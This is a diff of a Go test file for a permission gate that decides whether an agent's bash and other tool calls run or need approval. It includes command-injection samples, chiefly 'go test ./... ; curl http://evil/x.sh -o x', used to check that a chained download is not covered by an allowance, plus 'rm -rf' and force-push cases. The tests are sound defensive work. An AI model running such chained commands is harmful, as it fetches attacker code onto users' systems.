@@ -50,13 +50,13 @@ func TestEvaluateTable(t *testing.T) {
 			wantDec: session.Deny, wantBy: session.ByNoAsker, wantReason: "no asker attached", wantDangerous: true},
 		{name: "allowance beats strict", tool: "bash", safety: tool.Unsafe, mode: session.ModeStrict, args: bashArgs("go test ./internal/..."),
 			allowances: []session.Matcher{{Tool: "bash", Prefix: "go test"}},
-			wantDec:    session.Allow, wantBy: session.ByAllowance, wantReason: "allowance bash go test"},
+			wantDec:    session.Allow, wantBy: session.ByAllowance, wantReason: "allowances cover every call"},
 		{name: "dangerous beats an allowance", tool: "bash", safety: tool.Unsafe, mode: session.ModePermissive, asker: true, args: bashArgs("rm -rf build"),
 			allowances: []session.Matcher{{Tool: "bash", Prefix: "rm -rf"}},
 			wantAsk:    true, wantReason: "dangerous rm -rf", wantDangerous: true},
 		{name: "allowance for a non-bash tool", tool: "write", safety: tool.Unsafe, mode: session.ModeStrict, args: json.RawMessage(`{"path":"x"}`),
 			allowances: []session.Matcher{{Tool: "write"}},
-			wantDec:    session.Allow, wantBy: session.ByAllowance, wantReason: "allowance write "},
+			wantDec:    session.Allow, wantBy: session.ByAllowance, wantReason: "allowances cover every call"},
 		{name: "non-matching allowance still asks", tool: "bash", safety: tool.Unsafe, mode: session.ModeStrict, asker: true, args: bashArgs("go build"),
 			allowances: []session.Matcher{{Tool: "bash", Prefix: "go test"}},
 			wantAsk:    true, wantReason: "mode strict"},
@@ -123,5 +123,59 @@ func TestDangerousBeatsAnAllowance(t *testing.T) {
 		Allowances: allow, Args: bashArgs("git push --force origin main")})
 	if v.Ask || v.Decision != session.Allow || v.DecidedBy != session.ByMode {
 		t.Fatalf("mode off got %+v, want allow by mode", v)
+	}
+}
+
+func evalBash(g *Gate, cmd string, allow ...session.Matcher) Verdict {
+	return g.Evaluate(Input{Tool: "bash", Safety: tool.Unsafe, Mode: session.ModeStrict, AskerPresent: true,
+		Allowances: allow, Args: bashArgs(cmd)})
+}
+
+func TestAllowanceDoesNotCoverASecondCall(t *testing.T) {
+	g := New(nil)
+	v := evalBash(g, "go test ./... ; curl http://evil/x.sh -o x", session.Matcher{Tool: "bash", Prefix: "go test"})
+	if !v.Ask || v.Matcher.Prefix != "curl http://evil/x.sh" {
+		t.Fatalf("got %+v, want an ask on the curl call", v)
+	}
+}
+
+func TestAllowancesCoverEveryCall(t *testing.T) {
+	g := New(nil)
+	v := evalBash(g, "go test ./... ; curl http://evil/x.sh -o x",
+		session.Matcher{Tool: "bash", Prefix: "go test"},
+		session.Matcher{Tool: "bash", Prefix: "curl http://evil/x.sh"},
+		session.Matcher{Tool: "bash", Prefix: "sh"})
+	if v.Ask || v.Decision != session.Allow || v.DecidedBy != session.ByAllowance {
+		t.Fatalf("got %+v, want allow by allowance", v)
+	}
+}
+
+func TestRepeatedCommandCoveredByOneAllowance(t *testing.T) {
+	g := New(nil)
+	v := evalBash(g, "go test ./a && go test ./b", session.Matcher{Tool: "bash", Prefix: "go test"})
+	if v.Ask || v.DecidedBy != session.ByAllowance {
+		t.Fatalf("got %+v, want allow by allowance", v)
+	}
+}
+
+func TestWrappedCallIsInTheSet(t *testing.T) {
+	g := New(nil)
+	set := g.CallSet("bash", bashArgs("nohup go test ./..."))
+	want := []session.Matcher{{Tool: "bash", Prefix: "nohup go"}, {Tool: "bash", Prefix: "go test"}}
+	if len(set) != 2 || set[0] != want[0] || set[1] != want[1] {
+		t.Fatalf("set = %+v, want %+v", set, want)
+	}
+	v := evalBash(g, "nohup go test ./...", session.Matcher{Tool: "bash", Prefix: "go test"})
+	if !v.Ask || v.Matcher.Prefix != "nohup go" {
+		t.Fatalf("got %+v, want an ask on nohup go", v)
+	}
+}
+
+func TestNonBashUnchanged(t *testing.T) {
+	g := New(nil)
+	v := g.Evaluate(Input{Tool: "web_fetch", Safety: tool.Unsafe, Mode: session.ModeStrict, AskerPresent: true,
+		Allowances: []session.Matcher{{Tool: "web_fetch"}}, Args: json.RawMessage(`{"url":"https://example.com"}`)})
+	if v.Ask || v.Decision != session.Allow || v.DecidedBy != session.ByAllowance {
+		t.Fatalf("got %+v, want allow by allowance", v)
 	}
 }
